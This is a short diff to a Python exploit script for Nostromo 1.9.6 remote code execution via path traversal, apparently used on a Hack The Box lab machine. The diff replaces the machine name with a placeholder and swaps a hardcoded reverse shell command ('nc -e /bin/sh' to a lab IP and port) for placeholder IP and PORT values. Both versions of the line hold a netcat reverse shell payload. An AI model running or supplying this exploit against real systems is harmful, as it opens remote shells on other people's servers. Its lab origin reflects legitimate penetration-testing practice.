@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# exploit i used to get the initial shell on traverxec machine from HTB
+# exploit i used to get the initial shell on [NOT_YET_RETIRED] machine from HTB
 # origin by sp0re
 # Nostromo 1.9.6 RCE through path traversal
 import socket
@@ -11,7 +11,7 @@ parser.add_argument('port',help='port number',type=int)
 args = parser.parse_args()
 
 # Modify the ip and the port to get the reverse shell
-cmd = "nc -e /bin/sh 10.10.10.115 1212"
+cmd = "nc -e /bin/sh IP PORT"
 
 def recv(s):
 	r=''
